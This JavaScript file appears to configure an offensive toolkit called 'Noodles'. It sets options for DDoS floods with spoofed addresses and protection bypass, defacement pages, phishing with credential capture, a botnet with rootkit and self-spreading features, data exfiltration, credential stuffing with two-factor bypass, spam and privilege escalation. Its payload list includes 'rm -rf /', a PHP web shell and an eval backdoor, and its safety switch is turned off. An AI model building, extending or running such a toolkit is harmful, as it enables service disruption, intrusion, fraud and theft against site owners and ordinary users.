const credentials = {
  ddos: {
    methods: ['TCP-SYN', 'UDP-Flood', 'HTTP-GET', 'HTTP-POST', 'Slowloris', 'NTP-Amplification', 'DNS-Amplification', 'ACK-Flood', 'RST-Flood', 'ICMP-Flood', 'SYN-ACK-Flood', 'HTTP-Proxy', 'SOCKS4-Proxy', 'SOCKS5-Proxy', 'LAND-Attack', 'Ping-of-Death', 'Smurf-Attack', 'Teardrop-Attack', 'HTTP-RefRef', 'HTTP-RAW', 'TLS-Flood', 'ICMPv6-Flood', 'SYN-Fragment'],
    maxThreads: 16384,
    maxConnections: 32768,
    packetSizes: [64, 128, 256, 512, 1024, 2048, 4096, 8192, 16384, 32768, 65535, 131070],
    torProxyList: [
      'socks5://127.0.0.1:9050',
      'socks5://127.0.0.1:9051',
      'socks5://127.0.0.1:9052',
      'socks5://127.0.0.1:9053',
      'socks5://127.0.0.1:9054',
      'socks5://127.0.0.1:9055',
      'socks5://127.0.0.1:9056',
      'socks5://127.0.0.1:9057',
      'socks5://127.0.0.1:9058',
      'socks5://127.0.0.1:9059',
      'socks5://127.0.0.1:9060',
      'socks5://127.0.0.1:9061',
      'socks5://127.0.0.1:9062',
      'socks5://127.0.0.1:9063',
      'socks5://127.0.0.1:9064',
      'socks5://127.0.0.1:9065',
      'socks5://127.0.0.1:9066',
      'socks5://127.0.0.1:9067',
      'socks5://127.0.0.1:9068',
      'socks5://127.0.0.1:9069',
    ],
    userAgentFile: './main/ddos/useragents.txt',
    rateLimitBypass: {
      techniques: ['cloudflare_bypass', 'incapsula_bypass', 'Sucuri_bypass', 'Akamai_bypass', 'custom_headers', 'browser_emulation', 'http2_abuse', 'domain_fronting', 'tls_fingerprint'],
      headers: {
        'X-Forwarded-For': '127.0.0.1',
        'X-Real-IP': '127.0.0.1',
        'User-Agent': 'Noodles Bot',
        'Referer': 'https://google.com',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'cross-site',
        'Pragma': 'no-cache',
        'DNT': '1',
        'X-Requested-With': 'XMLHttpRequest',
        'X-Noodles-Bypass': 'true',
      },
    },
    advancedOptions: {
      autoAdjustThreads: true,
      randomizePacketSize: true,
      spoofSourceAddress: true,
      maxDuration: 86400,
      useKeepAlive: true,
      maxRetries: 5,
      concurrentConnections: 2048,
      socketTimeout: 30,
      tcpNoDelay: true,
    },
    httpRawOptions: {
      get: "GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {useragent}\r\nConnection: keep-alive\r\nX-Noodles-Raw: true\r\n\r\n",
      post: "POST / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {useragent}\r\nContent-Length: 1000\r\nConnection: keep-alive\r\nX-Noodles-Raw: true\r\n\r\n{data}\r\n",
      randomDataLength: 1024,
    },
    tlsOptions: {
      ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384',
      ecdhCurve: 'prime256v1',
      honorCipherOrder: true,
      secureProtocol: 'TLSv1_2_method',
      rejectUnauthorized: false,
    },
    proxyRotationInterval: 60000,
  },
  defacement: {
    payloads: {
      'default': '<body bgcolor="black"><center><h1 style="color:red;">HACKED BY NOODLES</h1><p style="color:white;">Site owned.</p></center></body>',
      'political': '<body bgcolor="black"><center><h1 style="color:yellow;">FREEDOM</h1><p style="color:white;">The truth will prevail.</p></center></body>',
      'nsfw': '<body bgcolor="black"><center><img src="https://example.com/nsfw.gif" alt="NSFW Image"><p style="color:white;">Get Noodled!</p></center></body>',
      'rickroll': '<body bgcolor="black"><center><iframe width="560" height="315" src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1" title="Rickroll Video" frameborder="0" allowfullscreen></iframe></center></body>',
      'custom': '<body bgcolor="black"><center><h1 style="color:lime;">Custom Hacked by Noodles</h1><p style="color:white;">{customPayload}</p></center></body>',
      'donation': '<body bgcolor="black"><center><h1 style="color:lime;">SUPPORT US</h1><p style="color:white;">Donate Bitcoin: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa</p></center></body>'
    },
    injectionPoints: ['</body>', '</html>', '<head>', '<form>', '<div>', '<script>', '<iframe>', '<meta>', 'title'],
    autoReplace: true,
    imageUrls: [
      'https://example.com/image1.jpg',
      'https://example.com/image2.png',
      'https://example.com/image3.gif',
      'https://example.com/image4.jpeg',
      'https://example.com/image5.svg',
      'https://example.com/image6.bmp',
      'https://example.com/image7.webp',
      'https://example.com/image8.ico',
    ],
    obfuscate: true,
    backupContent: true,
    recursiveInjection: true,
    maxRecursionDepth: 5,
    excludePaths: ['/wp-admin', '/admin', '/login'],
    httpMethods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS'],
    dynamicInjection: true,
    dynamicPayloadUrl: 'http://example.com/dynamic_payload.js',
  },
  connection: {
    ports: [21, 22, 23, 80, 443, 8080, 25, 110, 143, 587, 993, 995, 3306, 3389, 27017, 6379, 5432, 1433, 1521, 33060, 5060, 5061, 8443, 9200, 28017],
    timeout: 1000,
    scanType: ['TCP-Connect', 'TCP-SYN', 'UDP', 'Xmas', 'Null', 'FIN', 'TCP-ACK', 'TCP-Window', 'TCP-URG', 'SCTP-INIT', 'SCTP-COOKIE-ECHO'],
    concurrency: 2048,
    stealthMode: true,
    randomizePorts: true,
    maxRetries: 3,
    delay: 10,
    ipFragmentation: true,
    ttl: 64,
    rateLimit: 10000,
  },
  logs: {
    maxEntries: 100000,
    logLevel: ['info', 'warn', 'error', 'debug', 'verbose', 'security', 'attack', 'scan'],
    fileRotation: true,
    maxLogFiles: 30,
    logFormat: 'json',
    remoteSyslog: {
      enabled: true,
      host: 'syslog.example.com',
      port: 514,
      protocol: 'UDP',
      tlsEnabled: true,
      tlsOptions: {
        rejectUnauthorized: false,
      },
    },
    consoleOutput: true,
    elasticsearch: {
      enabled: false,
      host: 'localhost:9200',
      index: 'noodles-logs',
      username: 'elastic',
      password: 'elasticPassword',
    },
  },
  ui: {
    theme: 'darkly',
    resizable: true,
    compact: true,
    animations: true,
    fontSize: '13px',
    customCss: `
      .attack-button {
        background-color: #FF4136 !important;
        color: white !important;
      }
      .attack-button:hover {
        background-color: #D72318 !important;
      }
      .log-entry {
        font-family: monospace;
        white-space: pre-wrap;
        word-break: break-all;
      }
    `,
    notifications: true,
    enableSounds: true,
    customFavicon: 'https://example.com/favicon.ico',
    defaultLayout: 'horizontal',
    enableTooltips: true,
    fullscreenMode: true,
    keyboardShortcuts: {
      attack: 'Ctrl+A',
      scan: 'Ctrl+S',
      deface: 'Ctrl+D',
    },
  },
  apiKeys: [
    'YOUR_API_KEY_HERE',
    'ANOTHER_API_KEY',
    'ADMIN_KEY',
    'ULTIMATE_KEY',
    'NOODLES_KEY',
    'DARK_KEY'
  ],
  honeypotIps: [
    '1.1.1.1',
    '8.8.8.8',
    '9.9.9.9',
    '192.168.1.1',
    '10.0.0.1',
    '172.16.0.1',
    '2.2.2.2',
    '4.4.4.4',
    '169.254.169.254',
    '203.0.113.45',
  ],
  proxyCheckUrl: 'http://example.com',
  autoUpdate: true,
  errorReporting: true,
  debugMode: true,
  exploitDatabaseUrl: 'http://example.com/exploits.json',
  backupServerUrl: 'http://backup.example.com',
  rateLimit: {
    requestsPerMinute: 480,
    burstLimit: 800,
    banDuration: 1200,
    useRedis: true,
    redisConfig: {
      host: 'localhost',
      port: 6379,
      password: 'redisPassword',
    },
    ipWhitelist: ['127.0.0.1', '::1'],
    ipBlacklist: ['192.168.0.100'],
  },
  geoIpLookupUrl: 'http://example.com/geoip',
  signature: 'Noodles v1.0',
  autoBan: {
    enabled: true,
    threshold: 3,
    duration: 14400,
    whitelistIps: ['127.0.0.1', '::1'],
    blacklistIps: ['192.168.0.100'],
    logBannedIps: true,
    notifyAdmin: true,
    adminEmail: 'admin@example.com',
  },
  security: {
    xssProtection: true,
    csrfProtection: true,
    contentSecurityPolicy: "default-src 'self' 'unsafe-inline' 'unsafe-eval'; img-src 'self' data: https://www.youtube.com; font-src 'self' data: https://www.youtube.com; media-src 'self' data: https://www.youtube.com; object-src 'none'; frame-src https://www.youtube.com;",
    hstsEnabled: true,
    hstsMaxAge: 31536000,
    clickjackingProtection: true,
    strictTransportSecurity: 'max-age=31536000; includeSubDomains; preload',
    subresourceIntegrity: true,
    referrerPolicy: 'no-referrer',
    featurePolicy: "geolocation 'none'; midi 'none'; camera 'none'; microphone 'none'",
  },
  monitoring: {
    systemStats: true,
    networkStats: true,
    processStats: true,
    bandwidthStats: true,
    alerting: {
      cpuThreshold: 95,
      memoryThreshold: 95,
      diskThreshold: 98,
      emailAlerts: true,
      emailConfig: {
        service: 'gmail',
        auth: {
          user: 'monitoring@example.com',
          pass: 'monitoringPassword',
        },
        to: 'admin@example.com',
      },
      smsAlerts: true,
      webhookAlerts: true,
      webhookUrl: 'http://example.com/alerts',
      slackAlerts: true,
      slackWebhookUrl: 'http://slack.example.com/webhook',
    },
    logToFile: true,
    logFilePath: './logs/monitoring.log',
    prometheusExporter: true,
    prometheusPort: 9090,
  },
  modules: {
    portScanner: true,
    whoisLookup: true,
    headerGrabber: true,
    dnsLookup: true,
    reverseIpLookup: true,
    subnetCalculator: true,
    geoIpLookup: true,
    emailValidator: true,
    passwordGenerator: true,
    hashCalculator: true,
    urlShortener: true,
    screenshotTaker: true,
    sourceCodeViewer: true,
    httpStatusChecker: true,
    traceroute: true,
    ping: true,
    macAddressLookup: true,
  },
  spam: {
    email: {
      enabled: true,
      smtpServer: 'smtp.example.com',
      smtpPort: 587,
      username: 'spam@example.com',
      password: 'spamPassword',
      fromAddress: 'spam@example.com',
      rateLimit: 600,
      spoofSender: true,
      htmlContent: '<p>You have been Noodled!</p><img src="https://example.com/noodle_image.gif">',
      attachmentFile: './main/spam/attachment.pdf',
      dkimSigning: true,
      domainKey: '-----BEGIN RSA PRIVATE KEY-----\n...\n-----END RSA PRIVATE KEY-----\n',
      spfRecord: 'v=spf1 a mx ip4:192.0.2.0/24 -all',
    },
    sms: {
      enabled: true,
      apiEndpoint: 'https://sms.example.com/send',
      apiKey: 'SMS_API_KEY',
      rateLimit: 200,
      spoofNumber: true,
      messageTemplates: [
        'You have won a free Noodle!',
        'Your account has been Noodled.',
        'Claim your free Noodle now!',
      ],
    },
    socialMedia: {
      enabled: false,
      apiKeys: {
        twitter: 'TWITTER_API_KEY',
        facebook: 'FACEBOOK_API_KEY',
        instagram: 'INSTAGRAM_API_KEY',
      },
      rateLimit: 50,
      spamMessages: [
        'Get Noodled!',
        'Noodles are the best!',
      ],
    },
    pushNotifications: {
      enabled: false,
      apiKey: 'PUSH_API_KEY',
      rateLimit: 100,
      notificationTemplates: [
        'Noodles Alert!',
        'A new Noodle is available!',
      ],
    }
  },
  phishing: {
    cloneWebsite: true,
    redirectUrl: 'http://example.com/login',
    customPages: {
      'login': 'http://example.com/login.html',
      'signup': 'http://example.com/signup.html',
      'password_reset': 'http://example.com/reset.html',
    },
    sslEnabled: true,
    captureCredentials: true,
    logCredentials: true,
    credentialLogFile: './logs/credentials.log',
    sendCredentialsEmail: true,
    emailConfig: {
      service: 'gmail',
      auth: {
        user: 'phishing@example.com',
        pass: 'phishingPassword',
      },
      to: 'admin@example.com',
    },
    trackIpAddress: true,
    detectBots: true,
    bypassAntiPhishing: true,
    geoIpLookup: true,
    userAgentSpoofing: true,
    domainAgeCheck: true,
    emailSpoofing: true,
    linkObfuscation: true,
    automaticSubmission: true,
  },
  botnet: {
    enabled: true,
    controlServer: 'http://control.example.com',
    encryptionKey: 'SUPER_SECRET_KEY',
    heartbeatInterval: 60,
    commandAndControlProtocol: 'HTTP',
    autoSpread: true,
    selfUpdate: true,
    persistence: true,
    antiAnalysis: true,
    rootkitCapabilities: true,
    processHiding: true,
    networkStealth: true,
    userlandHooks: true,
    kernelModeDriver: true,
    communicationObfuscation: true,
    dynamicPayloadDelivery: true,
  },
  torIntegration: {
    enabled: true,
    controlPort: 9051,
    password: 'TOR_PASSWORD',
    newIdentityInterval: 300,
    autoRenewCircuits: true,
    hiddenService: {
      enabled: true,
      port: 80,
      targetPort: 8080,
      privateKey: '-----BEGIN RSA PRIVATE KEY-----\n...\n-----END RSA PRIVATE KEY-----\n',
    },
    obfs4Proxy: {
      enabled: true,
      address: 'obfs4.example.com:443',
      password: 'OBFS4_PASSWORD',
    },
    bridgeRelay: {
      enabled: false,
      address: 'bridge.example.com:9001',
      fingerprint: 'BRIDGE_FINGERPRINT',
    },
  },
  dataExfiltration: {
    enabled: true,
    exfiltrationMethod: ['FTP', 'HTTP', 'DNS', 'Email', 'ICMP', 'TOR', 'WebSockets', 'CloudStorage'],
    exfiltrationServer: 'ftp.example.com',
    exfiltrationPath: '/data',
    encryptionEnabled: true,
    compressionEnabled: true,
    chunkSize: 4096,
    obfuscateData: true,
    steganography: true,
    steganographyImage: './main/data_exfiltration/image.png',
    rateLimiting: true,
    rateLimitThreshold: 1000,
    dataEncoding: 'base64',
    errorCorrectionCoding: true,
    errorCorrectionScheme: 'Reed-Solomon',
    autoRetry: true,
    retryInterval: 60,
  },
  automaticExploitation: {
    enabled: true,
    targets: ['SQL Injection', 'XSS', 'RCE', 'LFI', 'RFI', 'CSRF', 'Directory Traversal', 'Code Injection', 'XXE', 'SSRF', 'Command Injection'],
    customExploits: [
      {
        name: 'MyCustomExploit',
        payload: 'evil_code',
        target: 'RCE',
        description: 'Custom RCE exploit for specific vulnerability',
        references: ['CVE-2023-XXXX', 'http://example.com/exploit'],
      }
    ],
    fuzzingEnabled: true,
    payloadList: ['../', '%00', '<script>alert("XSS")</script>', 'rm -rf /', 'SELECT * FROM users;', 'eval($_POST[cmd]);', '<?php system($_GET[cmd]); ?>'],
    autoTargetDiscovery: true,
    exploitDatabaseIntegration: true,
    zeroDayExploitSearch: true,
    metasploitIntegration: true,
    nessusIntegration: true,
    burpSuiteIntegration: true,
  },
  reverseEngineering: {
    enabled: true,
    disassembler: 'ghidra',
    debugger: 'x64dbg',
    decompiler: 'jd-gui',
    decompilationEnabled: true,
    debuggingEnabled: true,
    staticAnalysisEnabled: true,
    dynamicAnalysisEnabled: true,
    antiDebuggingTechniques: true,
    memoryAnalysis: true,
    binaryPatching: true,
    codeObfuscation: true,
    virtualMachineDetection: true,
    sandboxDetection: true,
    packerDetection: true,
    malwareAnalysis: true,
  },
  credentialStuffing: {
    enabled: true,
    credentialListUrl: 'http://example.com/credentials.txt',
    targetSites: ['http://example.com/login'],
    captchaBypass: true,
    proxyRotation: true,
    userAgentRotation: true,
    errorHandling: true,
    successRateTracking: true,
    accountLockoutBypass: true,
    twoFactorAuthBypass: true,
    apiBasedAttacks: true,
    credentialValidation: true,
    emailVerificationBypass: true,
    passwordResetAttack: true,
  },
  networkSniffing: {
    enabled: true,
    interface: 'eth0',
    promiscuousMode: true,
    captureAllTraffic: true,
    filterRules: ['port 80', 'port 443', 'host example.com'],
    packetAnalysis: true,
    protocolDissection: true,
    logSniffedData: true,
    sniffedDataLogFile: './logs/sniffed_data.log',
    livePacketAnalysis: true,
    wiresharkIntegration: true,
    tcpReassembly: true,
    sslDecryption: true,
    httpHeaderExtraction: true,
    dataCarving: true,
  },
  privilegeEscalation: {
    enabled: true,
    targets: ['Linux', 'Windows', 'MacOS'],
    knownVulnerabilities: ['CVE-2023-XXXX', 'CVE-2023-YYYY'],
    exploitExecution: true,
    kernelExploitation: true,
    postExploitation: true,
    persistenceMechanisms: ['Scheduled Tasks', 'Startup Scripts', 'Service Modification', 'Registry Keys', 'Cron Jobs'],
    rootkitInstallation: true,
    bypassUac: true,
    tokenManipulation: true,
    dllInjection: true,
    powershellExecution: true,
    shellcodeInjection: true,
    codeSigningBypass: true,
    kernelDriverExploitation: true,
  },
  hardwareHacking: {
    enabled: false,
    jtagDebugging: true,
    uartCommunication: true,
    spiFlashProgramming: true,
    reverseEngineeringFirmware: true,
    sideChannelAttacks: true,
    faultInjection: true,
    physicalAccessRequired: false,
    glitchingAttacks: true,
    probingAttacks: true,
    chipOffAnalysis: true,
    busPirateIntegration: true,
    arduinoIntegration: true,
    raspberryPiIntegration: true,
  },
  socialEngineering: {
    enabled: true,
    pretextLibrary: ['Impersonating IT Support', 'Fake Job Offer', 'Emergency Assistance'],
    spearPhishingCampaign: true,
    vishingCampaign: true,
    baitingTechniques: ['Infected USB Drives', 'Free Software Download'],
    quidProQuo: true,
    tailgating: false,
    dumpsterDiving: false,
    influenceTechniques: ['Authority', 'Scarcity', 'Reciprocity'],
    psychologicalManipulation: true,
    emotionalExploitation: true,
    informationGathering: true,
    osint: true,
    facialRecognition: true,
    voiceCloning: true,
    deepfakeGeneration: true,
    socialMediaScraping: true,
  },
  ransomware: {
    enabled: false,
    encryptionAlgorithm: 'AES-256',
    fileExtensions: ['.docx', '.pdf', '.jpg', '.zip'],
    ransomNote: 'Your files have been encrypted. Pay Bitcoin to recover them.',
    paymentDeadline: 72,
    threatActorAttribution: 'Noodles Gang',
    dataLeakageThreat: true,
    automaticDecryption: false,
    antiSandboxTechniques: true,
    virtualMachineDetection: true,
    processHollowing: true,
    codeInjection: true,
    antiDebugging: true,
    persistenceMechanisms: ['Scheduled Tasks', 'Registry Keys'],
    networkPropagation: true,
    lateralMovement: true,
  },
  dataWiping: {
    enabled: false,
    wipingAlgorithm: 'Gutmann',
    iterations: 35,
    targetDirectories: ['/home', '/var/log', '/tmp'],
    secureDeletion: true,
    overwriteFreeSpace: true,
    shreddingTechniques: true,
    antiForensicMeasures: true,
    irreversibleDeletion: true,
    diskWiping: true,
    partitionDeletion: true,
    mbrOverwrite: true,
    biosCorruption: true,
    driveEncryption: true,
    hardwareDestruction: true,
  },
  // Added a section to disable potentially malicious features
  safety: {
    disableDangerousFeatures: false,
    disabledModules: []
  }
};

if (credentials.safety.disableDangerousFeatures) {
  credentials.safety.disabledModules.forEach(moduleName => {
    if (credentials[moduleName]) {
      console.warn(`[SECURITY] Disabling potentially dangerous module: ${moduleName}`);
      for (const key in credentials[moduleName]) {
        if (typeof credentials[moduleName][key] === 'boolean') {
          credentials[moduleName][key] = false;
        } else if (Array.isArray(credentials[moduleName][key])){
            credentials[moduleName][key] = [];
        } else if (typeof credentials[moduleName][key] === 'string'){
            credentials[moduleName][key] = '';
        } else if(typeof credentials[moduleName][key] === 'number'){
          credentials[moduleName][key] = 0;
        }
      }
    }
  });
}

module.exports = credentials;